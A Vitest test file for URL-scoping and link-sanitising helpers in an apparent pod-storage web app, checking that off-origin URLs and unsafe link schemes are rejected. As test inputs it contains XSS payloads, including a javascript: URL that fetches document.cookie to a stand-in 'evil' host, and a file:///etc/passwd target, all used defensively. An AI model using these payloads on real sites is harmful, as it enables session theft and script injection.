import { describe, expect, it } from "vitest";
import { isWithinPod, isInOwnPods, safeLinkHref } from "./pod-scope.js";

describe("isWithinPod", () => {
  const root = "https://alice.pod.example/storage/";

  it("accepts the pod root itself and descendants", () => {
    expect(isWithinPod("https://alice.pod.example/storage/", root)).toBe(true);
    expect(isWithinPod("https://alice.pod.example/storage", root)).toBe(true);
    expect(isWithinPod("https://alice.pod.example/storage/health/note.ttl", root)).toBe(true);
    expect(isWithinPod("https://alice.pod.example/storage/a/b/c", root)).toBe(true);
  });

  it("ignores query and fragment on the target", () => {
    expect(isWithinPod("https://alice.pod.example/storage/x?y=1#z", root)).toBe(true);
  });

  it("rejects a different origin (the SEC-1 token-leak vector)", () => {
    expect(isWithinPod("https://evil.example/storage/x", root)).toBe(false);
    expect(isWithinPod("https://alice.pod.example.evil.com/storage/x", root)).toBe(false);
  });

  it("rejects a different scheme or port", () => {
    expect(isWithinPod("http://alice.pod.example/storage/x", root)).toBe(false);
    expect(isWithinPod("https://alice.pod.example:8443/storage/x", root)).toBe(false);
  });

  it("rejects a sibling prefix that is not a real path descendant", () => {
    expect(isWithinPod("https://alice.pod.example/storage-evil/x", root)).toBe(false);
    expect(isWithinPod("https://alice.pod.example/other/x", root)).toBe(false);
  });

  it("rejects non-http(s) and unparseable targets", () => {
    expect(isWithinPod("javascript:alert(1)", root)).toBe(false);
    expect(isWithinPod("file:///etc/passwd", root)).toBe(false);
    expect(isWithinPod("not a url", root)).toBe(false);
  });
});

describe("isInOwnPods", () => {
  it("accepts a target under any of the user's storages", () => {
    const storages = ["https://a.example/s/", "https://b.example/s/"];
    expect(isInOwnPods("https://b.example/s/x", storages)).toBe(true);
    expect(isInOwnPods("https://c.example/s/x", storages)).toBe(false);
    expect(isInOwnPods("https://b.example/s/x", [])).toBe(false);
  });
});

describe("safeLinkHref", () => {
  it("allows http, https and mailto", () => {
    expect(safeLinkHref("https://example.com/x")).toBe("https://example.com/x");
    expect(safeLinkHref("http://example.com")).toBe("http://example.com");
    expect(safeLinkHref("mailto:a@b.com")).toBe("mailto:a@b.com");
  });

  it("blocks javascript:, data:, vbscript: (the SEC-2 XSS vector)", () => {
    expect(safeLinkHref("javascript:alert(document.cookie)")).toBeUndefined();
    expect(safeLinkHref("JavaScript:alert(1)")).toBeUndefined();
    expect(safeLinkHref("data:text/html,<script>alert(1)</script>")).toBeUndefined();
    expect(safeLinkHref("vbscript:msgbox(1)")).toBeUndefined();
  });

  it("blocks the comment-newline javascript form that survives an empty-host check", () => {
    // `new URL(...).host` is non-empty here ("%0aalert(1)"), so a host-only guard
    // would let it through; the protocol check does not (security review).
    expect(safeLinkHref("javascript://%0aalert(1)//x")).toBeUndefined();
    expect(safeLinkHref("javascript://comment%0afetch('https://evil/'+document.cookie)//"))
      .toBeUndefined();
  });

  it("returns undefined for relative/opaque values (render as text)", () => {
    expect(safeLinkHref("../relative")).toBeUndefined();
    expect(safeLinkHref("#frag")).toBeUndefined();
    expect(safeLinkHref("")).toBeUndefined();
  });
});
